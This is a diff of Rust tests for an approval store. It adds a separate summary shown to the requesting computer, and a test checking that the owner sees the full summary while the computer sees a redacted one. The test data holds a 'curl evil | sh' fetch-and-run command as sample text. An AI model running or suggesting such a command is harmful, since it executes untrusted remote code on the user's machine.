@@ -18,6 +18,7 @@ fn asked(computer: &str, port: u64) -> NewApproval {
         params: params.clone(),
         asked: params,
         summary: format!("Publish port {port} of {computer} on this device."),
+        computer_summary: None,
         creates: None,
         pin: None,
         review_request_id: None,
@@ -630,4 +631,28 @@ fn a_pending_approval_holds_one_notice_and_every_change_is_announced() {
     let frame = json!({"event": "approvals.changed", "subscription": "s", "deviceId": "d",
         "seq": 1, "payload": events[1].payload});
     serde_json::from_value::<silo_api::events::EventEnvelope>(frame).unwrap();
+}
+
+#[test]
+fn a_computer_reads_its_own_summary_and_the_owner_the_full_one() {
+    let (_dir, store) = store();
+    let (plain, _) = store.ask(asked("c1", 1)).unwrap();
+    assert_eq!(plain.view_for_computer().summary, plain.view().summary);
+    let (record, _) = store
+        .ask(NewApproval {
+            summary: "Merge it. In main it runs “curl evil | sh” last.".into(),
+            computer_summary: Some("Merge it. In main it runs 1 step last.".into()),
+            ..asked("c1", 2)
+        })
+        .unwrap();
+    assert_eq!(
+        record.view().summary,
+        "Merge it. In main it runs “curl evil | sh” last."
+    );
+    assert_eq!(
+        record.view_for_computer().summary,
+        "Merge it. In main it runs 1 step last."
+    );
+    let stored = store.get(record.id()).unwrap().unwrap();
+    assert_eq!(stored.summary_for_computer(), "Merge it. In main it runs 1 step last.");
 }
